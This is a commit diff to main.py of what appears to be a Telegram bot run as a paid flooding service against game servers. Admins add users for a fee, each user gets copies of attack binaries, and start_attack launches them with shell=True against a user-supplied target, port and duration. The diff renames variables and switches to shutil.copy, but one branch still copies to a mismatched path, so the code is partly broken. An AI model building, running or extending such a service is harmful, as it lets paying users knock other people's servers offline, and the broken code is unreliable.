4a8c754cd4559dc3d4b7dbe2df38e03870f1711b
BgmiFiles809 <178407188+BgmiFiles809@users.noreply.github.com>
2024-09-15 02:10:01 -0700

    Add files via upload

--- main.py
+++ main.py
@@ -151,9 +151,9 @@ def add_user(message):
 
                 # Create copies of bgmi, sahil files for the new user
                 user_bgmi_path = f'bgmi{user_id}'
-                user_venom_path = f'venom{user_id}'
-                venom.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
-                venom.copy(ORIGINAL_VENOM_PATH, user_venom_path)
+                user_venom_path = f'bgmi2{user_id}'
+                shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
+                shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
 
                 response = f"User {user_id} added successfully for {duration} days by {admin_username} 👍. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
             else:
@@ -172,7 +172,7 @@ def add_user(message):
 
                 # Create copies of bgmi,sahil files for the new user
                 user_bgmi_path = f'bgmi{user_id}'              
-                user_sahil_path = f'venom{user_id}'
+                user_sahil_path = f'bgmi2{user_id}'
                 shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
                 shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
 
@@ -256,7 +256,7 @@ def show_user_id(message):
 def start_attack(user_id, target, port, duration):
     attack_id = f"{user_id} {target} {port}"
     bgmi_file = f"bgmi{user_id}"
-    sahil_file = f"sahil{user_id}"
+    bgmi2_file = f"bgmi2{user_id}"
     user = bot.get_chat(user_id)
     username = f"@{user.username}" if user.username else f"UserID: {user_id}"
     log_command(user_id, target, port, duration)
@@ -265,7 +265,7 @@ def start_attack(user_id, target, port, duration):
     try:
         ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 200", shell=True)
         time.sleep(5)
-        subprocess.run(f"./{venom_file} {target} {port} {duration} 200", shell=True)
+        subprocess.run(f"./{bgmi2_file} {target} {port} {duration} 200", shell=True)
       # Set cooldown for normal users after a successful attack
         if user_id not in ADMIN_IDS:
             user_cooldowns[user_id] = datetime.datetime.now()
